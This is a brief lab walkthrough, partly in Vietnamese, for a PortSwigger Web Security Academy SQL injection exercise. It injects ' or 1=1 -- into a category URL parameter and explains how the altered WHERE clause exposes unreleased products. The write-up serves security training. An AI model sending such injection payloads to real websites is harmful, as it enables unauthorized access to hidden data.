# **Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:  
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
>  To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.  

# Solution:
Dựa theo câu truy vấn ta xác định có 2 đối số là category và released. Thực hiện tiêm sql vào đối số qua URL:  
> https://0a8400e904e4b81e80b6718200c7009f.web-security-academy.net/filter?category=Gifts

Sửa URL:  
> https://0a8400e904e4b81e80b6718200c7009f.web-security-academy.net/filter?category=Gifts%27%20or%201=1%20--

Ở đây câu truy vấn sẽ thành:  
```
SELECT * FROM products WHERE category = 'Gifts' or 1=1 --' AND released = 1
```
Vì 1=1 luôn đúng và phần sql phía sau -- bị comment nên câu truy vấn thực sự là:
```
SELECT * FROM products WHERE category = 'Gifts' or 1=1
```
Như vậy kết quả trả về sẽ là toàn bộ sản phẩm, bao gồm các hàng bị ẩn.
![Image](https://i.pinimg.com/736x/f5/68/04/f56804886125925b781864924c8c8ddc.jpg)